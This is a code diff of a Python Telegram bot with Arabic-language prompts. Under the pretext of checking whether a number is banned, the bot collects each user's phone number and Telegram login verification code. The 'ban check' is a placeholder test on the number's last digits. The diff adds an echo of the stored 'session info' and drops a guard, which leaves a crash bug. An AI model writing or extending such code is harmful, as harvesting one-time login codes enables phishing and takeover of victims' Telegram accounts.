@@ -24,17 +24,17 @@ def button(update: Update, context: CallbackContext) -> None:
     
     if query.data == 'enter_number':
         context.user_data['awaiting_number'] = True
-        query.edit_message_text("👋 الرجاء إدخال رقم التليجرام الخاص بك:")
+        query.edit_message_text("👋 الرجاء إدخال رقم التليجرام الخاص بك مع رمز الدولة (مثال: +201234567890):")
     elif query.data == 'help':
-        query.edit_message_text("ℹ️ هذا البوت يساعدك على التحقق من أرقام التليجرام. الرجاء إدخال رقم التليجرام الخاص بك بعد اختيار 'إدخال رقم التليجرام'.")
-        
+        query.edit_message_text("ℹ️ هذا البوت يساعدك على التحقق من أرقام التليجرام. الرجاء إدخال رقم التليجرام الخاص بك مع رمز الدولة بعد اختيار 'إدخال رقم التليجرام'.")
+
 def handle_number(update: Update, context: CallbackContext) -> None:
     user_id = update.message.from_user.id
     user_number = update.message.text
 
     if context.user_data.get('awaiting_number'):
         try:
-            phone_number = phonenumbers.parse(user_number, "IN")
+            phone_number = phonenumbers.parse(user_number)
             if phonenumbers.is_valid_number(phone_number):
                 users_data[user_id] = {'phone_number': user_number}
                 context.user_data['awaiting_number'] = False
@@ -50,20 +50,20 @@ def handle_code(update: Update, context: CallbackContext) -> None:
     user_code = update.message.text
 
     if context.user_data.get('awaiting_code'):
-        if user_id in users_data:
-            users_data[user_id]['verification_code'] = user_code
-            context.user_data['awaiting_code'] = False
-            update.message.reply_text("✅ تم استقبال رمز التحقق.")
-            
-            # فحص الرقم هنا (مثال بسيط للتحقق إذا كان الرقم محظورًا)
-            if users_data[user_id]['phone_number'].endswith("1234"):
-                update.message.reply_text("🚫 الرقم محظور.")
-            else:
-                update.message.reply_text("✅ الرقم صالح وغير محظور.")
+        users_data[user_id]['verification_code'] = user_code
+        context.user_data['awaiting_code'] = False
+
+        # فحص الرقم هنا (مثال بسيط للتحقق إذا كان الرقم محظورًا)
+        if users_data[user_id]['phone_number'].endswith("1234"):
+            update.message.reply_text("🚫 الرقم محظور.")
         else:
-            update.message.reply_text("❌ لم يتم استقبال رقم الهاتف. الرجاء إرسال رقم الهاتف أولاً.")
+            update.message.reply_text("✅ الرقم صالح وغير محظور.")
+            
+        # إرسال الجلسة للمستخدم (كمثال)
+        session_info = f"رقم الهاتف: {users_data[user_id]['phone_number']}\nرمز التحقق: {users_data[user_id]['verification_code']}"
+        update.message.reply_text(f"🔐 معلومات الجلسة:\n{session_info}")
     else:
-        update.message.reply_text("❌ لم يتم استقبال رمز التحقق. الرجاء إدخال رقم الهاتف أولاً.")
+        update.message.reply_text("❌ لم يتم استقبال رقم الهاتف. الرجاء إرسال رقم الهاتف أولاً.")
 
 def main() -> None:
     updater = Updater(TOKEN)
